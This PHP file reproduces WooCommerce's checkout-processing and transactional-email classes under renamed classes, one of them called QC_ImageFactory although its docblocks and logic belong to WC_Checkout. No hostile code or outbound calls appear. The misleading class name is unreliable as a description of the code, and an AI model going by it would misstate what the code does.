<?php
class QC_ImageFactory {

	/** @var array Array of posted form data. */
	public $posted;

	/** @var array Array of fields to display on the checkout. */
	public $checkout_fields;

	/** @var bool Whether or not the user must create an account to checkout. */
	public $must_create_account;

	/** @var bool Whether or not signups are allowed. */
	public $enable_signup;

	/** @var object The shipping method being used. */
	private $shipping_method;

	/** @var WC_Payment_Gateway|string The payment gateway being used. */
	private $payment_method;

	/** @var int ID of customer. */
	private $customer_id;

	/** @var array Where shipping_methods are stored. */
	public $shipping_methods;

	/**
	 * @var WC_Checkout The single instance of the class
	 * @since 2.1
	 */
	protected static $_instance = null;

	/** @var Bool */
	public $enable_guest_checkout;

	/**
	 * Main WC_Checkout Instance.
	 *
	 * Ensures only one instance of WC_Checkout is loaded or can be loaded.
	 *
	 * @since 2.1
	 * @static
	 * @return WC_Checkout Main instance
	 */
	public static function instance() {
		if ( is_null( self::$_instance ) )
			self::$_instance = new self();
		return self::$_instance;
	}

	/**
	 * Cloning is forbidden.
	 *
	 * @since 2.1
	 */
	public function __clone() {
		_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );
	}

	/**
	 * Unserializing instances of this class is forbidden.
	 *
	 * @since 2.1
	 */
	public function __wakeup() {
		_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );
	}

	/**
	 * Constructor for the checkout class. Hooks in methods and defines checkout fields.
	 *
	 * @access public
	 */
	public function __construct () {
		add_action( 'woocommerce_checkout_billing', array( $this,'checkout_form_billing' ) );
		add_action( 'woocommerce_checkout_shipping', array( $this,'checkout_form_shipping' ) );

		$this->enable_signup         = get_option( 'woocommerce_enable_signup_and_login_from_checkout' ) == 'yes' ? true : false;
		$this->enable_guest_checkout = get_option( 'woocommerce_enable_guest_checkout' ) == 'yes' ? true : false;
		$this->must_create_account   = $this->enable_guest_checkout || is_user_logged_in() ? false : true;

		// Define all Checkout fields
		$this->checkout_fields['billing'] 	= WC()->countries->get_address_fields( $this->get_value( 'billing_country' ), 'billing_' );
		$this->checkout_fields['shipping'] 	= WC()->countries->get_address_fields( $this->get_value( 'shipping_country' ), 'shipping_' );

		if ( get_option( 'woocommerce_registration_generate_username' ) == 'no' ) {
			$this->checkout_fields['account']['account_username'] = array(
				'type' 			=> 'text',
				'label' 		=> __( 'Account username', 'woocommerce' ),
				'required'      => true,
				'placeholder' 	=> _x( 'Username', 'placeholder', 'woocommerce' )
			);
		}

		if ( get_option( 'woocommerce_registration_generate_password' ) == 'no' ) {
			$this->checkout_fields['account']['account_password'] = array(
				'type' 				=> 'password',
				'label' 			=> __( 'Account password', 'woocommerce' ),
				'required'          => true,
				'placeholder' 		=> _x( 'Password', 'placeholder', 'woocommerce' )
			);
		}

		$this->checkout_fields['order']	= array(
			'order_comments' => array(
				'type' => 'textarea',
				'class' => array('notes'),
				'label' => __( 'Order Notes', 'woocommerce' ),
				'placeholder' => _x('Notes about your order, e.g. special notes for delivery.', 'placeholder', 'woocommerce')
			)
		);

		$this->checkout_fields = apply_filters( 'woocommerce_checkout_fields', $this->checkout_fields );

		do_action( 'woocommerce_checkout_init', $this );
	}

	/**
	 * Checkout process.
	 */
	public function check_cart_items() {
		// When we process the checkout, lets ensure cart items are rechecked to prevent checkout
		do_action('woocommerce_check_cart_items');
	}

	/**
	 * Output the billing information form.
	 */
	public function checkout_form_billing() {
		wc_get_template( 'checkout/form-billing.php', array( 'checkout' => $this ) );
	}

	/**
	 * Output the shipping information form.
	 */
	public function checkout_form_shipping() {
		wc_get_template( 'checkout/form-shipping.php', array( 'checkout' => $this ) );
	}

	/**
	 * Create an order. Error codes:
	 * 		520 - Cannot insert order into the database.
	 * 		521 - Cannot get order after creation.
	 * 		522 - Cannot update order.
	 * 		525 - Cannot create line item.
	 * 		526 - Cannot create fee item.
	 * 		527 - Cannot create shipping item.
	 * 		528 - Cannot create tax item.
	 * 		529 - Cannot create coupon item.
	 * @access public
	 * @throws Exception
	 * @return int|WP_ERROR
	 */
	public function create_order() {
		global $wpdb;

		// Give plugins the opportunity to create an order themselves
		if ( $order_id = apply_filters( 'woocommerce_create_order', null, $this ) ) {
			return $order_id;
		}

		try {
			// Start transaction if available
			wc_transaction_query( 'start' );

			$order_data = array(
				'status'        => apply_filters( 'woocommerce_default_order_status', 'pending' ),
				'customer_id'   => $this->customer_id,
				'customer_note' => isset( $this->posted['order_comments'] ) ? $this->posted['order_comments'] : '',
				'cart_hash'     => md5( json_encode( wc_clean( WC()->cart->get_cart_for_session() ) ) . WC()->cart->total ),
				'created_via'   => 'checkout',
			);

			// Insert or update the post data
			$order_id = absint( WC()->session->order_awaiting_payment );

			/**
			 * If there is an order pending payment, we can resume it here so
			 * long as it has not changed. If the order has changed, i.e.
			 * different items or cost, create a new order. We use a hash to
			 * detect changes which is based on cart items + order total.
			 */
			if ( $order_id && $order_data['cart_hash'] === get_post_meta( $order_id, '_cart_hash', true ) && ( $order = wc_get_order( $order_id ) ) && $order->has_status( array( 'pending', 'failed' ) ) ) {

				$order_data['order_id'] = $order_id;
				$order                  = wc_update_order( $order_data );

				if ( is_wp_error( $order ) ) {
					throw new Exception( sprintf( __( 'Error %d: Unable to create order. Please try again.', 'woocommerce' ), 522 ) );
				} else {
					$order->remove_order_items();
					do_action( 'woocommerce_resume_order', $order_id );
				}

			} else {

				$order = wc_create_order( $order_data );

				if ( is_wp_error( $order ) ) {
					throw new Exception( sprintf( __( 'Error %d: Unable to create order. Please try again.', 'woocommerce' ), 520 ) );
				} elseif ( false === $order ) {
					throw new Exception( sprintf( __( 'Error %d: Unable to create order. Please try again.', 'woocommerce' ), 521 ) );
				} else {
					$order_id = $order->id;
					do_action( 'woocommerce_new_order', $order_id );
				}
			}

			// Store the line items to the new/resumed order
			foreach ( WC()->cart->get_cart() as $cart_item_key => $values ) {
				$item_id = $order->add_product(
					$values['data'],
					$values['quantity'],
					array(
						'variation' => $values['variation'],
						'totals'    => array(
							'subtotal'     => $values['line_subtotal'],
							'subtotal_tax' => $values['line_subtotal_tax'],
							'total'        => $values['line_total'],
							'tax'          => $values['line_tax'],
							'tax_data'     => $values['line_tax_data'] // Since 2.2
						)
					)
				);

				if ( ! $item_id ) {
					throw new Exception( sprintf( __( 'Error %d: Unable to create order. Please try again.', 'woocommerce' ), 525 ) );
				}

				// Allow plugins to add order item meta
				do_action( 'woocommerce_add_order_item_meta', $item_id, $values, $cart_item_key );
			}

			// Store fees
			foreach ( WC()->cart->get_fees() as $fee_key => $fee ) {
				$item_id = $order->add_fee( $fee );

				if ( ! $item_id ) {
					throw new Exception( sprintf( __( 'Error %d: Unable to create order. Please try again.', 'woocommerce' ), 526 ) );
				}

				// Allow plugins to add order item meta to fees
				do_action( 'woocommerce_add_order_fee_meta', $order_id, $item_id, $fee, $fee_key );
			}

			// Store shipping for all packages
			foreach ( WC()->shipping->get_packages() as $package_key => $package ) {
				if ( isset( $package['rates'][ $this->shipping_methods[ $package_key ] ] ) ) {
					$item_id = $order->add_shipping( $package['rates'][ $this->shipping_methods[ $package_key ] ] );

					if ( ! $item_id ) {
						throw new Exception( sprintf( __( 'Error %d: Unable to create order. Please try again.', 'woocommerce' ), 527 ) );
					}

					// Allows plugins to add order item meta to shipping
					do_action( 'woocommerce_add_shipping_order_item', $order_id, $item_id, $package_key );
				}
			}

			// Store tax rows
			foreach ( array_keys( WC()->cart->taxes + WC()->cart->shipping_taxes ) as $tax_rate_id ) {
				if ( $tax_rate_id && ! $order->add_tax( $tax_rate_id, WC()->cart->get_tax_amount( $tax_rate_id ), WC()->cart->get_shipping_tax_amount( $tax_rate_id ) ) && apply_filters( 'woocommerce_cart_remove_taxes_zero_rate_id', 'zero-rated' ) !== $tax_rate_id ) {
					throw new Exception( sprintf( __( 'Error %d: Unable to create order. Please try again.', 'woocommerce' ), 528 ) );
				}
			}

			// Store coupons
			foreach ( WC()->cart->get_coupons() as $code => $coupon ) {
				if ( ! $order->add_coupon( $code, WC()->cart->get_coupon_discount_amount( $code ), WC()->cart->get_coupon_discount_tax_amount( $code ) ) ) {
					throw new Exception( sprintf( __( 'Error %d: Unable to create order. Please try again.', 'woocommerce' ), 529 ) );
				}
			}

			// Billing address
			$billing_address = array();
			if ( $this->checkout_fields['billing'] ) {
				foreach ( array_keys( $this->checkout_fields['billing'] ) as $field ) {
					$field_name = str_replace( 'billing_', '', $field );
					$billing_address[ $field_name ] = $this->get_posted_address_data( $field_name );
				}
			}

			// Shipping address.
			$shipping_address = array();
			if ( $this->checkout_fields['shipping'] ) {
				foreach ( array_keys( $this->checkout_fields['shipping'] ) as $field ) {
					$field_name = str_replace( 'shipping_', '', $field );
					$shipping_address[ $field_name ] = $this->get_posted_address_data( $field_name, 'shipping' );
				}
			}

			$order->set_address( $billing_address, 'billing' );
			$order->set_address( $shipping_address, 'shipping' );
			$order->set_payment_method( $this->payment_method );
			$order->set_total( WC()->cart->shipping_total, 'shipping' );
			$order->set_total( WC()->cart->get_cart_discount_total(), 'cart_discount' );
			$order->set_total( WC()->cart->get_cart_discount_tax_total(), 'cart_discount_tax' );
			$order->set_total( WC()->cart->tax_total, 'tax' );
			$order->set_total( WC()->cart->shipping_tax_total, 'shipping_tax' );
			$order->set_total( WC()->cart->total );

			// Update user meta
			if ( $this->customer_id ) {
				if ( apply_filters( 'woocommerce_checkout_update_customer_data', true, $this ) ) {
					foreach ( $billing_address as $key => $value ) {
						update_user_meta( $this->customer_id, 'billing_' . $key, $value );
					}
					if ( WC()->cart->needs_shipping() ) {
						foreach ( $shipping_address as $key => $value ) {
							update_user_meta( $this->customer_id, 'shipping_' . $key, $value );
						}
					}
				}
				do_action( 'woocommerce_checkout_update_user_meta', $this->customer_id, $this->posted );
			}

			// Let plugins add meta
			do_action( 'woocommerce_checkout_update_order_meta', $order_id, $this->posted );

			// If we got here, the order was created without problems!
			wc_transaction_query( 'commit' );

		} catch ( Exception $e ) {
			// There was an error adding order data!
			wc_transaction_query( 'rollback' );
			return new WP_Error( 'checkout-error', $e->getMessage() );
		}

		return $order_id;
	}

	/**
	 * Process the checkout after the confirm order button is pressed.
	 */
	public function process_checkout() {
		try {
			if ( empty( $_POST['_wpnonce'] ) || ! wp_verify_nonce( $_POST['_wpnonce'], 'woocommerce-process_checkout' ) ) {
				WC()->session->set( 'refresh_totals', true );
				throw new Exception( __( 'We were unable to process your order, please try again.', 'woocommerce' ) );
			}

			if ( ! defined( 'WOOCOMMERCE_CHECKOUT' ) ) {
				define( 'WOOCOMMERCE_CHECKOUT', true );
			}

			// Prevent timeout
			@set_time_limit(0);

			do_action( 'woocommerce_before_checkout_process' );

			if ( WC()->cart->is_empty() ) {
				throw new Exception( sprintf( __( 'Sorry, your session has expired. <a href="%s" class="wc-backward">Return to shop</a>', 'woocommerce' ), esc_url( wc_get_page_permalink( 'shop' ) ) ) );
			}

			do_action( 'woocommerce_checkout_process' );

			// Checkout fields (not defined in checkout_fields)
			$this->posted['terms']                     = isset( $_POST['terms'] ) ? 1 : 0;
			$this->posted['createaccount']             = isset( $_POST['createaccount'] ) && ! empty( $_POST['createaccount'] ) ? 1 : 0;
			$this->posted['payment_method']            = isset( $_POST['payment_method'] ) ? stripslashes( $_POST['payment_method'] ) : '';
			$this->posted['shipping_method']           = isset( $_POST['shipping_method'] ) ? $_POST['shipping_method'] : '';
			$this->posted['ship_to_different_address'] = isset( $_POST['ship_to_different_address'] ) ? true : false;

			if ( isset( $_POST['shiptobilling'] ) ) {
				_deprecated_argument( 'WC_Checkout::process_checkout()', '2.1', 'The "shiptobilling" field is deprecated. The template files are out of date' );

				$this->posted['ship_to_different_address'] = $_POST['shiptobilling'] ? false : true;
			}

			// Ship to billing only option
			if ( wc_ship_to_billing_address_only() ) {
				$this->posted['ship_to_different_address']  = false;
			}

			// Update customer shipping and payment method to posted method
			$chosen_shipping_methods = WC()->session->get( 'chosen_shipping_methods' );

			if ( isset( $this->posted['shipping_method'] ) && is_array( $this->posted['shipping_method'] ) ) {
				foreach ( $this->posted['shipping_method'] as $i => $value ) {
					$chosen_shipping_methods[ $i ] = wc_clean( $value );
				}
			}

			WC()->session->set( 'chosen_shipping_methods', $chosen_shipping_methods );
			WC()->session->set( 'chosen_payment_method', $this->posted['payment_method'] );

			// Note if we skip shipping
			$skipped_shipping = false;

			// Get posted checkout_fields and do validation
			foreach ( $this->checkout_fields as $fieldset_key => $fieldset ) {

				// Skip shipping if not needed
				if ( $fieldset_key == 'shipping' && ( $this->posted['ship_to_different_address'] == false || ! WC()->cart->needs_shipping_address() ) ) {
					$skipped_shipping = true;
					continue;
				}

				// Skip account if not needed
				if ( 'account' === $fieldset_key && ( is_user_logged_in() || ( false === $this->must_create_account && empty( $this->posted['createaccount'] ) ) ) ) {
					continue;
				}

				foreach ( $fieldset as $key => $field ) {

					if ( ! isset( $field['type'] ) ) {
						$field['type'] = 'text';
					}

					// Get Value
					switch ( $field['type'] ) {
						case "checkbox" :
							$this->posted[ $key ] = isset( $_POST[ $key ] ) ? 1 : 0;
						break;
						case "multiselect" :
							$this->posted[ $key ] = isset( $_POST[ $key ] ) ? implode( ', ', array_map( 'wc_clean', $_POST[ $key ] ) ) : '';
						break;
						case "textarea" :
							$this->posted[ $key ] = isset( $_POST[ $key ] ) ? wp_strip_all_tags( wp_check_invalid_utf8( stripslashes( $_POST[ $key ] ) ) ) : '';
						break;
						default :
							$this->posted[ $key ] = isset( $_POST[ $key ] ) ? ( is_array( $_POST[ $key ] ) ? array_map( 'wc_clean', $_POST[ $key ] ) : wc_clean( $_POST[ $key ] ) ) : '';
						break;
					}

					// Hooks to allow modification of value
					$this->posted[ $key ] = apply_filters( 'woocommerce_process_checkout_' . sanitize_title( $field['type'] ) . '_field', $this->posted[ $key ] );
					$this->posted[ $key ] = apply_filters( 'woocommerce_process_checkout_field_' . $key, $this->posted[ $key ] );

					// Validation: Required fields
					if ( isset( $field['required'] ) && $field['required'] && ( ! isset( $this->posted[ $key ] ) || "" === $this->posted[ $key ] ) ) {
						switch ( $fieldset_key ) {
							case 'shipping' :
								$field_label = sprintf( _x( 'Shipping %s', 'Shipping FIELDNAME', 'woocommerce' ), $field['label'] );
							break;
							case 'billing' :
								$field_label = sprintf( _x( 'Billing %s', 'Billing FIELDNAME', 'woocommerce' ), $field['label'] );
							break;
							default :
								$field_label = $field['label'];
							break;
						}
						wc_add_notice( apply_filters( 'woocommerce_checkout_required_field_notice', sprintf( _x( '%s is a required field.', 'FIELDNAME is a required field.', 'woocommerce' ), '<strong>' . $field_label . '</strong>' ), $field_label ), 'error' );
					}

					if ( ! empty( $this->posted[ $key ] ) ) {

						// Validation rules
						if ( ! empty( $field['validate'] ) && is_array( $field['validate'] ) ) {
							foreach ( $field['validate'] as $rule ) {
								switch ( $rule ) {
									case 'postcode' :
										$this->posted[ $key ] = strtoupper( str_replace( ' ', '', $this->posted[ $key ] ) );

										if ( ! WC_Validation::is_postcode( $this->posted[ $key ], $_POST[ $fieldset_key . '_country' ] ) ) :
											wc_add_notice( __( 'Please enter a valid postcode/ZIP.', 'woocommerce' ), 'error' );
										else :
											$this->posted[ $key ] = wc_format_postcode( $this->posted[ $key ], $_POST[ $fieldset_key . '_country' ] );
										endif;
									break;
									case 'phone' :
										$this->posted[ $key ] = wc_format_phone_number( $this->posted[ $key ] );

										if ( ! WC_Validation::is_phone( $this->posted[ $key ] ) )
											wc_add_notice( '<strong>' . $field['label'] . '</strong> ' . __( 'is not a valid phone number.', 'woocommerce' ), 'error' );
									break;
									case 'email' :
										$this->posted[ $key ] = strtolower( $this->posted[ $key ] );

										if ( ! is_email( $this->posted[ $key ] ) )
											wc_add_notice( '<strong>' . $field['label'] . '</strong> ' . __( 'is not a valid email address.', 'woocommerce' ), 'error' );
									break;
									case 'state' :
										// Get valid states
										$valid_states = WC()->countries->get_states( isset( $_POST[ $fieldset_key . '_country' ] ) ? $_POST[ $fieldset_key . '_country' ] : ( 'billing' === $fieldset_key ? WC()->customer->get_country() : WC()->customer->get_shipping_country() ) );

										if ( ! empty( $valid_states ) && is_array( $valid_states ) ) {
											$valid_state_values = array_flip( array_map( 'strtolower', $valid_states ) );

											// Convert value to key if set
											if ( isset( $valid_state_values[ strtolower( $this->posted[ $key ] ) ] ) ) {
												 $this->posted[ $key ] = $valid_state_values[ strtolower( $this->posted[ $key ] ) ];
											}
										}

										// Only validate if the country has specific state options
										if ( ! empty( $valid_states ) && is_array( $valid_states ) && sizeof( $valid_states ) > 0 ) {
											if ( ! in_array( $this->posted[ $key ], array_keys( $valid_states ) ) ) {
												wc_add_notice( '<strong>' . $field['label'] . '</strong> ' . __( 'is not valid. Please enter one of the following:', 'woocommerce' ) . ' ' . implode( ', ', $valid_states ), 'error' );
											}
										}
									break;
								}
							}
						}
					}
				}
			}

			// Update customer location to posted location so we can correctly check available shipping methods
			if ( isset( $this->posted['billing_country'] ) ) {
				WC()->customer->set_country( $this->posted['billing_country'] );
			}
			if ( isset( $this->posted['billing_state'] ) ) {
				WC()->customer->set_state( $this->posted['billing_state'] );
			}
			if ( isset( $this->posted['billing_postcode'] ) ) {
				WC()->customer->set_postcode( $this->posted['billing_postcode'] );
			}

			// Shipping Information
			if ( ! $skipped_shipping ) {

				// Update customer location to posted location so we can correctly check available shipping methods
				if ( isset( $this->posted['shipping_country'] ) ) {
					WC()->customer->set_shipping_country( $this->posted['shipping_country'] );
				}
				if ( isset( $this->posted['shipping_state'] ) ) {
					WC()->customer->set_shipping_state( $this->posted['shipping_state'] );
				}
				if ( isset( $this->posted['shipping_postcode'] ) ) {
					WC()->customer->set_shipping_postcode( $this->posted['shipping_postcode'] );
				}

			} else {

				// Update customer location to posted location so we can correctly check available shipping methods
				if ( isset( $this->posted['billing_country'] ) ) {
					WC()->customer->set_shipping_country( $this->posted['billing_country'] );
				}
				if ( isset( $this->posted['billing_state'] ) ) {
					WC()->customer->set_shipping_state( $this->posted['billing_state'] );
				}
				if ( isset( $this->posted['billing_postcode'] ) ) {
					WC()->customer->set_shipping_postcode( $this->posted['billing_postcode'] );
				}

			}

			// Update cart totals now we have customer address
			WC()->cart->calculate_totals();

			// Terms
			if ( ! isset( $_POST['woocommerce_checkout_update_totals'] ) && empty( $this->posted['terms'] ) && wc_get_page_id( 'terms' ) > 0 && apply_filters( 'woocommerce_checkout_show_terms', true ) ) {
				wc_add_notice( __( 'You must accept our Terms &amp; Conditions.', 'woocommerce' ), 'error' );
			}

			if ( WC()->cart->needs_shipping() ) {
				$shipping_country = WC()->customer->get_shipping_country();

				if ( empty( $shipping_country ) ) {
					wc_add_notice( __( 'Please enter an address to continue.', 'woocommerce' ), 'error' );
				} elseif ( ! in_array( WC()->customer->get_shipping_country(), array_keys( WC()->countries->get_shipping_countries() ) ) ) {
					wc_add_notice( sprintf( __( 'Unfortunately <strong>we do not ship %s</strong>. Please enter an alternative shipping address.', 'woocommerce' ), WC()->countries->shipping_to_prefix() . ' ' . WC()->customer->get_shipping_country() ), 'error' );
				}

				// Validate Shipping Methods
				$packages               = WC()->shipping->get_packages();
				$this->shipping_methods = (array) WC()->session->get( 'chosen_shipping_methods' );

				foreach ( $packages as $i => $package ) {
					if ( ! isset( $package['rates'][ $this->shipping_methods[ $i ] ] ) ) {
						wc_add_notice( __( 'No shipping method has been selected. Please double check your address, or contact us if you need any help.', 'woocommerce' ), 'error' );
						$this->shipping_methods[ $i ] = '';
					}
				}
			}

			if ( WC()->cart->needs_payment() ) {
				// Payment Method
				$available_gateways = WC()->payment_gateways->get_available_payment_gateways();

				if ( ! isset( $available_gateways[ $this->posted['payment_method'] ] ) ) {
					$this->payment_method = '';
					wc_add_notice( __( 'Invalid payment method.', 'woocommerce' ), 'error' );
				} else {
					$this->payment_method = $available_gateways[ $this->posted['payment_method'] ];
					$this->payment_method->validate_fields();
				}
			} else {
				$available_gateways = array();
			}

			// Action after validation
			do_action( 'woocommerce_after_checkout_validation', $this->posted );

			if ( ! isset( $_POST['woocommerce_checkout_update_totals'] ) && wc_notice_count( 'error' ) == 0 ) {

				// Customer accounts
				$this->customer_id = apply_filters( 'woocommerce_checkout_customer_id', get_current_user_id() );

				if ( ! is_user_logged_in() && ( $this->must_create_account || ! empty( $this->posted['createaccount'] ) ) ) {

					$username     = ! empty( $this->posted['account_username'] ) ? $this->posted['account_username'] : '';
					$password     = ! empty( $this->posted['account_password'] ) ? $this->posted['account_password'] : '';
					$new_customer = wc_create_new_customer( $this->posted['billing_email'], $username, $password );

					if ( is_wp_error( $new_customer ) ) {
						throw new Exception( $new_customer->get_error_message() );
					} else {
						$this->customer_id = absint( $new_customer );
					}

					wc_set_customer_auth_cookie( $this->customer_id );

					// As we are now logged in, checkout will need to refresh to show logged in data
					WC()->session->set( 'reload_checkout', true );

					// Also, recalculate cart totals to reveal any role-based discounts that were unavailable before registering
					WC()->cart->calculate_totals();

					// Add customer info from other billing fields
					if ( $this->posted['billing_first_name'] && apply_filters( 'woocommerce_checkout_update_customer_data', true, $this ) ) {
						$userdata = array(
							'ID'           => $this->customer_id,
							'first_name'   => $this->posted['billing_first_name'] ? $this->posted['billing_first_name'] : '',
							'last_name'    => $this->posted['billing_last_name'] ? $this->posted['billing_last_name'] : '',
							'display_name' => $this->posted['billing_first_name'] ? $this->posted['billing_first_name'] : ''
						);
						wp_update_user( apply_filters( 'woocommerce_checkout_customer_userdata', $userdata, $this ) );
					}
				}

				// Do a final stock check at this point
				$this->check_cart_items();

				// Abort if errors are present
				if ( wc_notice_count( 'error' ) > 0 )
					throw new Exception();

				$order_id = $this->create_order();

				if ( is_wp_error( $order_id ) ) {
					throw new Exception( $order_id->get_error_message() );
				}

				do_action( 'woocommerce_checkout_order_processed', $order_id, $this->posted );

				// Process payment
				if ( WC()->cart->needs_payment() ) {

					// Store Order ID in session so it can be re-used after payment failure
					WC()->session->order_awaiting_payment = $order_id;

					// Process Payment
					$result = $available_gateways[ $this->posted['payment_method'] ]->process_payment( $order_id );

					// Redirect to success/confirmation/payment page
					if ( isset( $result['result'] ) && 'success' === $result['result'] ) {

						$result = apply_filters( 'woocommerce_payment_successful_result', $result, $order_id );

						if ( is_ajax() ) {
							wp_send_json( $result );
						} else {
							wp_redirect( $result['redirect'] );
							exit;
						}

					}

				} else {

					if ( empty( $order ) ) {
						$order = wc_get_order( $order_id );
					}

					// No payment was required for order
					$order->payment_complete();

					// Empty the Cart
					WC()->cart->empty_cart();

					// Get redirect
					$return_url = $order->get_checkout_order_received_url();

					// Redirect to success/confirmation/payment page
					if ( is_ajax() ) {
						wp_send_json( array(
							'result' 	=> 'success',
							'redirect'  => apply_filters( 'woocommerce_checkout_no_payment_needed_redirect', $return_url, $order )
						) );
					} else {
						wp_safe_redirect(
							apply_filters( 'woocommerce_checkout_no_payment_needed_redirect', $return_url, $order )
						);
						exit;
					}

				}

			}

		} catch ( Exception $e ) {
			if ( ! empty( $e ) ) {
				wc_add_notice( $e->getMessage(), 'error' );
			}
		}

		// If we reached this point then there were errors
		if ( is_ajax() ) {

			// only print notices if not reloading the checkout, otherwise they're lost in the page reload
			if ( ! isset( WC()->session->reload_checkout ) ) {
				ob_start();
				wc_print_notices();
				$messages = ob_get_clean();
			}

			$response = array(
				'result'	=> 'failure',
				'messages' 	=> isset( $messages ) ? $messages : '',
				'refresh' 	=> isset( WC()->session->refresh_totals ) ? 'true' : 'false',
				'reload'    => isset( WC()->session->reload_checkout ) ? 'true' : 'false'
			);

			unset( WC()->session->refresh_totals, WC()->session->reload_checkout );

			wp_send_json( $response );
		}
	}

	/**
	 * Get a posted address field after sanitization and validation.
	 * @param string $key
	 * @param string $type billing for shipping
	 * @return string
	 */
	public function get_posted_address_data( $key, $type = 'billing' ) {
		if ( 'billing' === $type || false === $this->posted['ship_to_different_address'] ) {
			$return = isset( $this->posted[ 'billing_' . $key ] ) ? $this->posted[ 'billing_' . $key ] : '';
		} else {
			$return = isset( $this->posted[ 'shipping_' . $key ] ) ? $this->posted[ 'shipping_' . $key ] : '';
		}

		// Use logged in user's billing email if neccessary
		if ( 'email' === $key && empty( $return ) && is_user_logged_in() ) {
			$current_user = wp_get_current_user();
			$return       = $current_user->user_email;
		}
		return $return;
	}

	/**
	 * Gets the value either from the posted data, or from the users meta data.
	 *
	 * @access public
	 * @param string $input
	 * @return string|null
	 */
	public function get_value( $input ) {
		if ( ! empty( $_POST[ $input ] ) ) {

			return wc_clean( $_POST[ $input ] );

		} else {

			$value = apply_filters( 'woocommerce_checkout_get_value', null, $input );

			if ( $value !== null ) {
				return $value;
			}

			// Get the billing_ and shipping_ address fields
			if ( isset( $this->checkout_fields['shipping'] ) && isset( $this->checkout_fields['billing'] ) ) {

				$address_fields = array_merge( $this->checkout_fields['billing'], $this->checkout_fields['shipping'] );

				if ( is_user_logged_in() && is_array( $address_fields ) && array_key_exists( $input, $address_fields ) ) {
					$current_user = wp_get_current_user();

					if ( $meta = get_user_meta( $current_user->ID, $input, true ) ) {
						return $meta;
					}

					if ( $input == 'billing_email' ) {
						return $current_user->user_email;
					}
				}

			}

			switch ( $input ) {
				case 'billing_country' :
					return apply_filters( 'default_checkout_country', WC()->customer->get_country() ? WC()->customer->get_country() : '', 'billing' );
				case 'billing_state' :
					return apply_filters( 'default_checkout_state', WC()->customer->get_state() ? WC()->customer->get_state() : '', 'billing' );
				case 'billing_postcode' :
					return apply_filters( 'default_checkout_postcode', WC()->customer->get_postcode() ? WC()->customer->get_postcode() : '', 'billing' );
				case 'shipping_country' :
					return apply_filters( 'default_checkout_country', WC()->customer->get_shipping_country() ? WC()->customer->get_shipping_country() : '', 'shipping' );
				case 'shipping_state' :
					return apply_filters( 'default_checkout_state', WC()->customer->get_shipping_state() ? WC()->customer->get_shipping_state() : '', 'shipping' );
				case 'shipping_postcode' :
					return apply_filters( 'default_checkout_postcode', WC()->customer->get_shipping_postcode() ? WC()->customer->get_shipping_postcode() : '', 'shipping' );
				default :
					return apply_filters( 'default_checkout_' . $input, null, $input );
			}
		}
	}
}

class QC_Emails {

	/** @var array Array of email notification classes */
	public $emails;

	/** @var WC_Emails The single instance of the class */
	protected static $_instance = null;

	/**
	 * Main WC_Emails Instance.
	 *
	 * Ensures only one instance of WC_Emails is loaded or can be loaded.
	 *
	 * @since 2.1
	 * @static
	 * @return WC_Emails Main instance
	 */
	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}

	/**
	 * Cloning is forbidden.
	 *
	 * @since 2.1
	 */
	public function __clone() {
		_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );
	}

	/**
	 * Unserializing instances of this class is forbidden.
	 *
	 * @since 2.1
	 */
	public function __wakeup() {
		_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );
	}

	/**
	 * Hook in all transactional emails.
	 */
	public static function init_transactional_emails() {
		$email_actions = apply_filters( 'woocommerce_email_actions', array(
			'woocommerce_low_stock',
			'woocommerce_no_stock',
			'woocommerce_product_on_backorder',
			'woocommerce_order_status_pending_to_processing',
			'woocommerce_order_status_pending_to_completed',
			'woocommerce_order_status_pending_to_cancelled',
			'woocommerce_order_status_pending_to_failed',
			'woocommerce_order_status_pending_to_on-hold',
			'woocommerce_order_status_failed_to_processing',
			'woocommerce_order_status_failed_to_completed',
			'woocommerce_order_status_failed_to_on-hold',
			'woocommerce_order_status_on-hold_to_processing',
			'woocommerce_order_status_on-hold_to_cancelled',
			'woocommerce_order_status_on-hold_to_failed',
			'woocommerce_order_status_completed',
			'woocommerce_order_fully_refunded',
			'woocommerce_order_partially_refunded',
			'woocommerce_new_customer_note',
			'woocommerce_created_customer'
		) );

		foreach ( $email_actions as $action ) {
			add_action( $action, array( __CLASS__, 'send_transactional_email' ), 10, 10 );
		}
	}

	/**
	 * Init the mailer instance and call the notifications for the current filter.
	 * @internal param array $args (default: array())
	 */
	public static function send_transactional_email() {
		self::instance();
		$args = func_get_args();
		do_action_ref_array( current_filter() . '_notification', $args );
	}

	/**
	 * Constructor for the email class hooks in all emails that can be sent.
	 *
	 */
	public function __construct() {
		$this->init();

		// Email Header, Footer and content hooks
		add_action( 'woocommerce_email_header', array( $this, 'email_header' ) );
		add_action( 'woocommerce_email_footer', array( $this, 'email_footer' ) );
		add_action( 'woocommerce_email_order_details', array( $this, 'order_details' ), 10, 4 );
		add_action( 'woocommerce_email_order_details', array( $this, 'order_schema_markup' ), 20, 4 );
		add_action( 'woocommerce_email_order_meta', array( $this, 'order_meta' ), 10, 3 );
		add_action( 'woocommerce_email_customer_details', array( $this, 'customer_details' ), 10, 3 );
		add_action( 'woocommerce_email_customer_details', array( $this, 'email_addresses' ), 20, 3 );

		// Hooks for sending emails during store events
		add_action( 'woocommerce_low_stock_notification', array( $this, 'low_stock' ) );
		add_action( 'woocommerce_no_stock_notification', array( $this, 'no_stock' ) );
		add_action( 'woocommerce_product_on_backorder_notification', array( $this, 'backorder' ) );
		add_action( 'woocommerce_created_customer_notification', array( $this, 'customer_new_account' ), 10, 3 );

		// Let 3rd parties unhook the above via this hook
		do_action( 'woocommerce_email', $this );
	}

	/**
	 * Init email classes.
	 */
	public function init() {
		// Include email classes
		include_once( 'emails/class-wc-email.php' );

		$this->emails['WC_Email_New_Order'] 		                 = include( 'emails/class-wc-email-new-order.php' );
		$this->emails['WC_Email_Cancelled_Order'] 		             = include( 'emails/class-wc-email-cancelled-order.php' );
		$this->emails['WC_Email_Failed_Order'] 		                 = include( 'emails/class-wc-email-failed-order.php' );
		$this->emails['WC_Email_Customer_On_Hold_Order'] 		     = include( 'emails/class-wc-email-customer-on-hold-order.php' );
